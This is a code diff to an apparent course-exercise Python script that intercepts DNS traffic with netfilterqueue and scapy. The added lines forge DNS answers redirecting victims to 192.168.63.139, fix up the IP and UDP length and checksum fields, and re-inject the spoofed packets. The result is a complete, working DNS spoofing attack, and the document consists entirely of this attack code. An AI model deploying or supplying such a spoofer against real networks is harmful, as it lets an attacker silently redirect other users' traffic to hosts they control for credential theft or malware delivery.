@@ -2,7 +2,7 @@
 
 import netfilterqueue
 from scapy.layers.inet import IP
-from scapy.layers.dns import DNSRR, DNSQR
+from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP
 
 def process_packet(packet):
     # Convert the packet to a scapy packet
@@ -23,10 +23,24 @@ def process_packet(packet):
             # This is where we want to redirect our user to
             answer = DNSRR(rrname=qname, rdata="192.168.63.139")
 
+            # Modify the answer field of scapy_packet, and make it equal
+            # to the answer field that we just created.
+            scapy_packet[DNS].an = answer
+            # provide 1 response to the question not multiple
+            scapy_packet[DNS].ancount = 1
 
+            # Delete fields we do not want, scapy will recalculate them
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[UDP].len
+            del scapy_packet[UDP].chksum
 
+            # Set the payload of the packet we sniffed "packet", to the
+            # packet we have modified, "scapy_packet"
+            packet.set_payload(str(scapy_packet))
 
-    # print(scapy_packet.show())
+            print(scapy_packet.show())
+
     # forward trapped packets to their destination
     packet.accept()
 
